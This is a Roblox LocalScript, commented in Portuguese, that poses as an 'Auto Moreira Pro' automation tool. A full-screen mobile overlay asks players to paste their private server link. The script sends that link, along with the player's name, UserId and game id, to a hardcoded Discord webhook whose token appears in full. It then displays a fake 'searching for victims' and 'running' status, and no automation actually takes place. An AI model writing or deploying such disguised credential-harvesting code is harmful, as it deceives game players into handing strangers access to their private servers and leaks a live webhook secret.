
-- LocalScript: AutoMoreiraPro
-- Coloque este script em StarterPlayerScripts

local Players = game:GetService("Players")
local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- SUA WEBHOOK DO DISCORD
local WEBHOOK_URL = "https://discord.com/api/webhooks/1434737213970579589/gYFJbyTHb72G0hGP6_nDOi951quXSmWW6CGv5CaaNRMkWIS8K_7ZF-HpPyti1NcEfaft"

-- Função para enviar para o Discord
local function sendToDiscord(link)
 local success, result = pcall(function()
  local data = {
   ["content"] = "🔗 **Novo Link Recebido - Auto Moreira Pro**",
   ["embeds"] = {{
    ["title"] = "Auto Método Moreira Pro",
    ["description"] = "Um usuário enviou um link para o Auto Moreira Pro",
    ["color"] = 16744192,
    ["fields"] = {
     {
      ["name"] = "📝 Link do Servidor",
      ["value"] = link,
      ["inline"] = false
     },
     {
      ["name"] = "👤 Usuário",
      ["value"] = player.Name,
      ["inline"] = true
     },
     {
      ["name"] = "🆔 UserId",
      ["value"] = tostring(player.UserId),
      ["inline"] = true
     },
     {
      ["name"] = "🎮 Jogo",
      ["value"] = tostring(game.PlaceId),
      ["inline"] = true
     }
    },
    ["footer"] = {
     ["text"] = "Auto Método Moreira Pro • " .. os.date("%d/%m/%Y %H:%M:%S")
    }
   }}
  }
  
  local jsonData = HttpService:JSONEncode(data)
  
  local response = HttpService:RequestAsync({
   Url = WEBHOOK_URL,
   Method = "POST",
   Headers = {
    ["Content-Type"] = "application/json"
   },
   Body = jsonData
  })
  
  return response.Success
 end)
	
 return success, result
end

-- Função para criar a interface
local function createInterface()
 -- Criar ScreenGui principal
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "AutoMoreiraPro"
 screenGui.DisplayOrder = 10 -- Alta prioridade
 screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true -- cobre também a barra superior
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = PlayerGui
	
 -- Criar frame principal que cobre toda a tela
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
 mainFrame.Size = UDim2.new(1, 0, 1, 0) -- 100% da tela
 mainFrame.Position = UDim2.new(0, 0, 0, 0)
 mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 35)
 mainFrame.BackgroundTransparency = 0.05 -- Menos transparente
 mainFrame.BorderSizePixel = 0
 mainFrame.Active = true
 mainFrame.Selectable = true
 mainFrame.Parent = screenGui
	
 -- Criar gradiente
 local gradient = Instance.new("UIGradient")
 gradient.Color = ColorSequence.new({
  ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 15, 35)),
  ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 55))
 })
 gradient.Rotation = 45
 gradient.Parent = mainFrame
	
 -- Container central
 local container = Instance.new("Frame")
 container.Name = "Container"
 container.Size = UDim2.new(0.85, 0, 0.65, 0) -- Tamanho ajustado
 container.Position = UDim2.new(0.075, 0, 0.175, 0) -- Posição ajustada
 container.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
 container.BackgroundTransparency = 0.1 -- Menos transparente
 container.BorderSizePixel = 0
 container.Parent = mainFrame
	
 local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0.04, 0)
 corner.Parent = container
	
 local shadow = Instance.new("UIStroke")
 shadow.Color = Color3.fromRGB(255, 100, 0)
 shadow.Thickness = 3
 shadow.Parent = container
	
 -- Título
 local title = Instance.new("TextLabel")
 title.Name = "Title"
 title.Size = UDim2.new(0.9, 0, 0.18, 0)
 title.Position = UDim2.new(0.05, 0, 0.05, 0)
 title.BackgroundTransparency = 1
 title.Text = "🔥 Auto Método Moreira Pro 🔥"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextScaled = true
 title.Font = Enum.Font.GothamBold
 title.TextStrokeTransparency = 0.7
 title.TextStrokeColor3 = Color3.fromRGB(255, 100, 0)
 title.ZIndex = 2
 title.Parent = container
	
 -- Descrição
 local description = Instance.new("TextLabel")
 description.Name = "Description"
 description.Size = UDim2.new(0.9, 0, 0.18, 0)
 description.Position = UDim2.new(0.05, 0, 0.25, 0)
 description.BackgroundTransparency = 1
 description.Text = "Cole aqui o link do seu servidor Privado para iniciar Auto Moreira"
 description.TextColor3 = Color3.fromRGB(200, 200, 255)
 description.TextScaled = true
 description.Font = Enum.Font.Gotham
 description.TextWrapped = true
 description.ZIndex = 2
 description.Parent = container
	
 -- Campo de texto
 local textBoxBackground = Instance.new("Frame")
 textBoxBackground.Name = "TextBoxBackground"
 textBoxBackground.Size = UDim2.new(0.9, 0, 0.22, 0)
 textBoxBackground.Position = UDim2.new(0.05, 0, 0.48, 0)
 textBoxBackground.BackgroundColor3 = Color3.fromRGB(35, 35, 65)
 textBoxBackground.BorderSizePixel = 0
 textBoxBackground.ZIndex = 2
 textBoxBackground.Parent = container
	
 local textBoxCorner = Instance.new("UICorner")
 textBoxCorner.CornerRadius = UDim.new(0.03, 0)
 textBoxCorner.Parent = textBoxBackground
	
 local textBoxStroke = Instance.new("UIStroke")
 textBoxStroke.Color = Color3.fromRGB(100, 100, 200)
 textBoxStroke.Thickness = 2
 textBoxStroke.Parent = textBoxBackground
	
 local textBox = Instance.new("TextBox")
 textBox.Name = "ServerLinkTextBox"
 textBox.Size = UDim2.new(0.95, 0, 0.8, 0)
 textBox.Position = UDim2.new(0.025, 0, 0.1, 0)
 textBox.BackgroundTransparency = 1
 textBox.Text = ""
 textBox.PlaceholderText = "https://www.roblox.com/games/..."
 textBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 180)
 textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 textBox.TextScaled = true
 textBox.Font = Enum.Font.Gotham
 textBox.TextXAlignment = Enum.TextXAlignment.Left
 textBox.ClearTextOnFocus = false
 textBox.ZIndex = 3
 textBox.Parent = textBoxBackground
	
 -- Botão de envio
 local submitButton = Instance.new("TextButton")
 submitButton.Name = "SubmitButton"
 submitButton.Size = UDim2.new(0.7, 0, 0.15, 0)
 submitButton.Position = UDim2.new(0.15, 0, 0.75, 0)
 submitButton.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
 submitButton.Text = "INICIAR AUTO MOREIRA"
 submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 submitButton.TextScaled = true
 submitButton.Font = Enum.Font.GothamBold
 submitButton.AutoButtonColor = true
 submitButton.ZIndex = 2
 submitButton.Parent = container
	
 local buttonCorner = Instance.new("UICorner")
 buttonCorner.CornerRadius = UDim.new(0.05, 0)
 buttonCorner.Parent = submitButton
	
 local buttonStroke = Instance.new("UIStroke")
 buttonStroke.Color = Color3.fromRGB(255, 150, 50)
 buttonStroke.Thickness = 2
 buttonStroke.Parent = submitButton
	
 -- Label para mostrar "Procurando Vítimas..."
 local statusLabel = Instance.new("TextLabel")
 statusLabel.Name = "StatusLabel"
 statusLabel.Size = UDim2.new(0.9, 0, 0.22, 0)
 statusLabel.Position = UDim2.new(0.05, 0, 0.48, 0)
 statusLabel.BackgroundTransparency = 1
 statusLabel.Text = "Aguarde:\nProcurando Vítimas..."
 statusLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
 statusLabel.TextScaled = true
 statusLabel.Font = Enum.Font.GothamBold
 statusLabel.TextWrapped = true
 statusLabel.ZIndex = 2
 statusLabel.Visible = false -- Inicialmente invisível
 statusLabel.Parent = container
	
 -- Efeitos de hover
 submitButton.MouseEnter:Connect(function()
  local tween = TweenService:Create(
   submitButton,
   TweenInfo.new(0.2),
   {BackgroundColor3 = Color3.fromRGB(255, 120, 20)}
  )
  tween:Play()
 end)
	
 submitButton.MouseLeave:Connect(function()
  local tween = TweenService:Create(
   submitButton,
   TweenInfo.new(0.2),
   {BackgroundColor3 = Color3.fromRGB(255, 100, 0)}
  )
  tween:Play()
 end)
	
 -- Função de envio
 submitButton.MouseButton1Click:Connect(function()
  local link = textBox.Text
  
  if link == "" then
   local originalColor = textBoxBackground.BackgroundColor3
   local tween = TweenService:Create(
    textBoxBackground,
    TweenInfo.new(0.3),
    {BackgroundColor3 = Color3.fromRGB(100, 35, 35)}
   )
   tween:Play()
   wait(0.5)
   local tweenBack = TweenService:Create(
    textBoxBackground,
    TweenInfo.new(0.3),
    {BackgroundColor3 = originalColor}
   )
   tweenBack:Play()
   return
  end
  
  submitButton.Text = "ENVIANDO..."
  submitButton.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
  submitButton.AutoButtonColor = false
  
  print("Link do servidor:", link)
  print("Enviando para Discord...")
  
  -- Enviar para o Discord
  local success, result = sendToDiscord(link)
  
  if success then
   -- Esconder o campo de texto e mostrar "Procurando Vítimas..."
   textBoxBackground.Visible = false
   statusLabel.Visible = true
   
   -- Manter o botão com nova mensagem
   submitButton.Text = "PROCESSANDO..."
   submitButton.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
   warn("Link enviado com sucesso para o Discord! Procurando vítimas...")
   
   -- Simular processo de busca (não fechar a interface)
   wait(3)
   
   -- Manter a interface aberta com a mensagem de status
   submitButton.Text = "EM EXECUÇÃO"
   submitButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
   
  else
   submitButton.Text = "ERRO! ✗"
   submitButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
   warn("Erro ao enviar para Discord: " .. tostring(result))
   
   -- Restaurar botão após erro
   wait(2)
   submitButton.Text = "INICIAR AUTO MOREIRA"
   submitButton.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
   submitButton.AutoButtonColor = true
  end
 end)
	
 warn("Interface Auto Moreira Pro carregada com sucesso!")
 return screenGui
end

-- Função para verificar se é dispositivo móvel
local function isMobile()
 return UserInputService.TouchEnabled
end

-- Inicializar a interface
if isMobile() then
 -- Esperar o player carregar completamente
 player:WaitForChild("PlayerGui")
	
 -- Pequeno delay para garantir que tudo carregou
 task.wait(2)
	
 -- Criar a interface
 local interface = createInterface()
	
 if interface then
  print("✅ Interface Auto Moreira Pro criada com sucesso!")
 else
  warn("❌ Erro ao criar interface")
 end
else
 warn("📱 Este script é otimizado para dispositivos móveis!")
end
